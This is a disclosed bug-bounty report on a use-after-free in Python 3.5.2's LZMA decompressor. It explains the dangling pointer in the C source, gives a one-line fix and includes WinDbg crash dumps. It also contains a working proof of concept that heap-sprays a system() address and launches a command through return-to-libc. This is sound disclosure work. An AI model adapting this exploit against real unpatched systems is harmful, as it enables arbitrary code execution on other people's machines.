# LZMADecompressor.decompress Use After Free

## Report Details
- **Report ID**: 172562
- **URL**: https://hackerone.com/reports/172562
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2016-09-28T05:25:11.429Z
- **Disclosed**: 2016-12-05T00:30:49.353Z

## Reporter
- **Username**: johnleitch
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
I have submitted a vulnerability that has now been fixed. The report includes a proof of concept that demonstrates code execution. The submitted patch was accepted with minor changes.

https://bugs.python.org/issue28275

---

Python 3.5.2 suffers from a use after free vulnerability caused by the behavior of the LZMADecompressor.decompress method. The problem exists due to a dangling pointer created by an incomplete error path in the _lzma!decompress function.

static PyObject *
decompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)
{
    char input_buffer_in_use;
    PyObject *result;
    lzma_stream *lzs = &d->lzs;

    /* Prepend unconsumed input if necessary */
    if (lzs->next_in != NULL) {
        [...]
    }
    else {
        lzs->next_in = data;
        lzs->avail_in = len;
        input_buffer_in_use = 0;
    }

    result = decompress_buf(d, max_length);
    if(result == NULL)
        return NULL;
    [...]
}

When the function is first called, lzs->next_in is NULL, so it is set using the data argument. If the subsequent call to decompress_buf fails because the stream is malformed, the function returns while maintaining the current value for lzs->next_in.

A couple returns later, the allocation pointed to by lzs->next_in (data) is freed:

static PyObject *
_lzma_LZMADecompressor_decompress(Decompressor *self, PyObject *args, PyObject *kwargs)
{
    PyObject *return_value = NULL;
    static char *_keywords[] = {"data", "max_length", NULL};
    Py_buffer data = {NULL, NULL};
    Py_ssize_t max_length = -1;

    if (!PyArg_ParseTupleAndKeywords(args, kwargs, "y*|n:decompress", _keywords,
        &data, &max_length))
        goto exit;
    return_value = _lzma_LZMADecompressor_decompress_impl(self, &data, max_length);

exit:
    /* Cleanup for data */
    if (data.obj)
       PyBuffer_Release(&data);

    return return_value;
}


At this point, any calls to decompress made to the same Decompressor instance (a typical use case--multiple calls may be necessary to decompress a single stream) will result in a memcpy to the dangling lzs->next_in pointer, and thus memory corruption.

static PyObject *
decompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)
{
    char input_buffer_in_use;
    PyObject *result;
    lzma_stream *lzs = &d->lzs;

    /* Prepend unconsumed input if necessary */
    if (lzs->next_in != NULL) {
        size_t avail_now, avail_total;
        [...]
        memcpy((void*)(lzs->next_in + lzs->avail_in), data, len);
        lzs->avail_in += len;
        input_buffer_in_use = 1;
    }
    else {
        [...]
    }
}

This vulnerability can be exploited to achieve arbitrary code execution. In applications where untrusted LZMA streams are received over a network, it might be possible to exploit this vulnerability remotely. A simple proof of concept that demonstrates a return-to-libc attack is attached.

import _lzma
from array import *

# System address when tested: 76064070
d = _lzma.LZMADecompressor()
spray = [];
for x in range(0, 0x700):
    meg = bytearray(b'\x76\x70\x40\x06' * int(0x100000 / 4));        
    spray.append(meg)

def foo():    
    for x in range(0, 2):
        try:
            d.decompress(b"\x20\x26\x20\x63\x61\x6c\x63\x00\x41\x41\x41\x41\x41\x41\x41\x41" * int(0x100 / (4*4)))
        except:
            pass
foo()
print(len(spray[0]))
print(len(spray))


To fix the issue, it is recommended that lzs->next_in be zeroed in the event the call to decompress_buf fails. A proposed patch is attached.

    result = decompress_buf(d, max_length);
    if(result == NULL) {
        lzs->next_in = 0;
        return NULL;
    }


A repro file is attached as well.

Exception details:

0:000> r
eax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8
eip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203
VCRUNTIME140D!TrailingDownVec+0x1f9:
6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????
0:000> k
ChildEBP RetAddr  
009ef3e4 5d573f80 VCRUNTIME140D!TrailingDownVec+0x1f9 [f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm @ 658]
009ef434 5d573383 _lzma_d!decompress+0x130 [c:\source2\python-3.5.2\modules\_lzmamodule.c @ 997]
009ef454 5d572049 _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93 [c:\source2\python-3.5.2\modules\_lzmamodule.c @ 1097]
009ef49c 55e6dd40 _lzma_d!_lzma_LZMADecompressor_decompress+0x79 [c:\source2\python-3.5.2\modules\clinic\_lzmamodule.c.h @ 99]
009ef4d4 55f65199 python35_d!PyCFunction_Call+0x80 [c:\source2\python-3.5.2\objects\methodobject.c @ 98]
009ef4fc 55f6008d python35_d!call_function+0x3e9 [c:\source2\python-3.5.2\python\ceval.c @ 4705]
009ef58c 55f6478d python35_d!PyEval_EvalFrameEx+0x509d [c:\source2\python-3.5.2\python\ceval.c @ 3238]
009ef5cc 55f5afbd python35_d!_PyEval_EvalCodeWithName+0x73d [c:\source2\python-3.5.2\python\ceval.c @ 4018]
009ef608 55f5af81 python35_d!PyEval_EvalCodeEx+0x2d [c:\source2\python-3.5.2\python\ceval.c @ 4039]
009ef63c 55fe67de python35_d!PyEval_EvalCode+0x21 [c:\source2\python-3.5.2\python\ceval.c @ 777]
009ef660 55fe2daa python35_d!run_mod+0x3e [c:\source2\python-3.5.2\python\pythonrun.c @ 976]
009ef69c 55fe3dac python35_d!PyRun_FileExFlags+0x9a [c:\source2\python-3.5.2\python\pythonrun.c @ 929]
009ef730 55fe2c5b python35_d!PyRun_SimpleFileExFlags+0x3ec [c:\source2\python-3.5.2\python\pythonrun.c @ 396]
009ef74c 55d39e6d python35_d!PyRun_AnyFileExFlags+0x6b [c:\source2\python-3.5.2\python\pythonrun.c @ 80]
009ef7a0 55d38821 python35_d!run_file+0x13d [c:\source2\python-3.5.2\modules\main.c @ 318]
009ef908 1c841331 python35_d!Py_Main+0xf01 [c:\source2\python-3.5.2\modules\main.c @ 768]
009ef918 1c84178e python_d!wmain+0x11 [c:\source2\python-3.5.2\programs\python.c @ 14]
009ef92c 1c8415da python_d!invoke_main+0x1e [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 89]
009ef984 1c84146d python_d!__scrt_common_main_seh+0x15a [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 264]
009ef98c 1c8417a8 python_d!__scrt_common_main+0xd [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 309]
009ef994 742438f4 python_d!wmainCRTStartup+0x8 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wmain.cpp @ 17]
009ef9a8 77545de3 KERNEL32!BaseThreadInitThunk+0x24
009ef9f0 77545dae ntdll!__RtlUserThreadStart+0x2f
009efa00 00000000 ntdll!_RtlUserThreadStart+0x1b
0:000> !heap -p -a edi
    address 09275fe8 found in
    _DPH_HEAP_ROOT @ 53a1000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    9182d68:          9275000             2000
    5c949cd2 verifier!AVrfDebugPageHeapFree+0x000000c2
    775be045 ntdll!RtlDebugFreeHeap+0x0000003c
    7751cc3e ntdll!RtlpFreeHeap+0x00000c3e
    7751b4c8 ntdll!RtlFreeHeap+0x00000268
    591067a7 ucrtbased!free_base+0x00000027
    5910394b ucrtbased!calloc_base+0x00000b5b
    5910617c ucrtbased!free_dbg+0x0000007c
    59106750 ucrtbased!free+0x00000010
    55e781bd python35_d!_PyMem_RawFree+0x0000000d [c:\source2\python-3.5.2\objects\obmalloc.c @ 90]
    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\source2\python-3.5.2\objects\obmalloc.c @ 1892]
    55e78434 python35_d!PyMem_RawFree+0x00000014 [c:\source2\python-3.5.2\objects\obmalloc.c @ 316]
    55e77ad1 python35_d!_PyObject_Free+0x00000591 [c:\source2\python-3.5.2\objects\obmalloc.c @ 1618]
    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\source2\python-3.5.2\objects\obmalloc.c @ 1892]
    55e78724 python35_d!PyObject_Free+0x00000014 [c:\source2\python-3.5.2\objects\obmalloc.c @ 410]
    55e02005 python35_d!bytes_dealloc+0x00000015 [c:\source2\python-3.5.2\objects\bytesobject.c @ 956]
    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\source2\python-3.5.2\objects\object.c @ 1786]
    55e922f7 python35_d!tupledealloc+0x000000c7 [c:\source2\python-3.5.2\objects\tupleobject.c @ 236]
    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\source2\python-3.5.2\objects\object.c @ 1786]
    55f651a9 python35_d!call_function+0x000003f9 [c:\source2\python-3.5.2\python\ceval.c @ 4707]
    55f6008d python35_d!PyEval_EvalFrameEx+0x0000509d [c:\source2\python-3.5.2\python\ceval.c @ 3238]
    55f6478d python35_d!_PyEval_EvalCodeWithName+0x0000073d [c:\source2\python-3.5.2\python\ceval.c @ 4018]
    55f5afbd python35_d!PyEval_EvalCodeEx+0x0000002d [c:\source2\python-3.5.2\python\ceval.c @ 4039]
    55f5af81 python35_d!PyEval_EvalCode+0x00000021 [c:\source2\python-3.5.2\python\ceval.c @ 777]
    55fe67de python35_d!run_mod+0x0000003e [c:\source2\python-3.5.2\python\pythonrun.c @ 976]
    55fe2daa python35_d!PyRun_FileExFlags+0x0000009a [c:\source2\python-3.5.2\python\pythonrun.c @ 929]
    55fe3dac python35_d!PyRun_SimpleFileExFlags+0x000003ec [c:\source2\python-3.5.2\python\pythonrun.c @ 396]
    55fe2c5b python35_d!PyRun_AnyFileExFlags+0x0000006b [c:\source2\python-3.5.2\python\pythonrun.c @ 80]
    55d39e6d python35_d!run_file+0x0000013d [c:\source2\python-3.5.2\modules\main.c @ 318]
    55d38821 python35_d!Py_Main+0x00000f01 [c:\source2\python-3.5.2\modules\main.c @ 768]
    1c841331 python_d!wmain+0x00000011 [c:\source2\python-3.5.2\programs\python.c @ 14]
    1c84178e python_d!invoke_main+0x0000001e [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 89]
    1c8415da python_d!__scrt_common_main_seh+0x0000015a [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 264]

 
0:000> !analyze -v -nodb
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************


FAULTING_IP: 
VCRUNTIME140D!TrailingDownVec+1f9 [f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm @ 658]
6bf55149 8917            mov     dword ptr [edi],edx

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 6bf55149 (VCRUNTIME140D!TrailingDownVec+0x000001f9)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000001
   Parameter[1]: 09275fe8
Attempt to write to address 09275fe8

CONTEXT:  00000000 -- (.cxr 0x0;r)
eax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8
eip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203
VCRUNTIME140D!TrailingDownVec+0x1f9:
6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????

FAULTING_THREAD:  000043fc

DEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE

PROCESS_NAME:  python_d.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION_PARAMETER1:  00000001

EXCEPTION_PARAMETER2:  09275fe8

WRITE_ADDRESS:  09275fe8 

FOLLOWUP_IP: 
VCRUNTIME140D!TrailingDownVec+1f9 [f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm @ 658]
6bf55149 8917            mov     dword ptr [edi],edx

NTGLOBALFLAG:  2000000

APPLICATION_VERIFIER_FLAGS:  0

APP:  python_d.exe

ANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_WRITE

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 5d573f80 to 6bf55149

STACK_TEXT:  
009ef3e4 5d573f80 09275fe8 08b44970 0000000a VCRUNTIME140D!TrailingDownVec+0x1f9
009ef434 5d573383 060e9f40 08b44970 0000000a _lzma_d!decompress+0x130
009ef454 5d572049 060e9f40 009ef468 ffffffff _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93
009ef49c 55e6dd40 060e9f40 079cec40 00000000 _lzma_d!_lzma_LZMADecompressor_decompress+0x79
009ef4d4 55f65199 08b53db8 079cec40 00000000 python35_d!PyCFunction_Call+0x80
009ef4fc 55f6008d 009ef540 079cec40 06143c78 python35_d!call_function+0x3e9
009ef58c 55f6478d 06143c78 00000000 1c84114f python35_d!PyEval_EvalFrameEx+0x509d
009ef5cc 55f5afbd 079eae60 06143c78 06171978 python35_d!_PyEval_EvalCodeWithName+0x73d
009ef608 55f5af81 079eae60 06171978 06171978 python35_d!PyEval_EvalCodeEx+0x2d
009ef63c 55fe67de 079eae60 06171978 06171978 python35_d!PyEval_EvalCode+0x21
009ef660 55fe2daa 08db1470 08b4b168 06171978 python35_d!run_mod+0x3e
009ef69c 55fe3dac 06e40fc0 079f30e0 00000101 python35_d!PyRun_FileExFlags+0x9a
009ef730 55fe2c5b 06e40fc0 079f30e0 00000001 python35_d!PyRun_SimpleFileExFlags+0x3ec
009ef74c 55d39e6d 06e40fc0 079f30e0 00000001 python35_d!PyRun_AnyFileExFlags+0x6b
009ef7a0 55d38821 06e40fc0 06012fa6 009ef85c python35_d!run_file+0x13d
009ef908 1c841331 00000002 06012f80 009ef92c python35_d!Py_Main+0xf01
009ef918 1c84178e 00000002 06012f80 0601af40 python_d!wmain+0x11
009ef92c 1c8415da 851961c5 1c84114f 1c84114f python_d!invoke_main+0x1e
009ef984 1c84146d 009ef994 1c8417a8 009ef9a8 python_d!__scrt_common_main_seh+0x15a
009ef98c 1c8417a8 009ef9a8 742438f4 006cd000 python_d!__scrt_common_main+0xd
009ef994 742438f4 006cd000 742438d0 939c497b python_d!wmainCRTStartup+0x8
009ef9a8 77545de3 006cd000 5080bb84 00000000 KERNEL32!BaseThreadInitThunk+0x24
009ef9f0 77545dae ffffffff 7756b7d7 00000000 ntdll!__RtlUserThreadStart+0x2f
009efa00 00000000 1c84114f 006cd000 00000000 ntdll!_RtlUserThreadStart+0x1b


STACK_COMMAND:  .cxr 0x0 ; kb

FAULTING_SOURCE_LINE:  f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm

FAULTING_SOURCE_FILE:  f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm

FAULTING_SOURCE_LINE_NUMBER:  658

SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  vcruntime140d!TrailingDownVec+1f9

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: VCRUNTIME140D

IMAGE_NAME:  VCRUNTIME140D.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  558ce3d5

FAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_VCRUNTIME140D.dll!TrailingDownVec

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ_vcruntime140d!TrailingDownVec+1f9

ANALYSIS_SOURCE:  UM

FAILURE_ID_HASH_STRING:  um:invalid_pointer_write_c0000005_vcruntime140d.dll!trailingdownvec

FAILURE_ID_HASH:  {935a9c66-b210-2678-8c10-c746a999bfb6}

Followup: MachineOwner
---------

## Attachments
No attachments
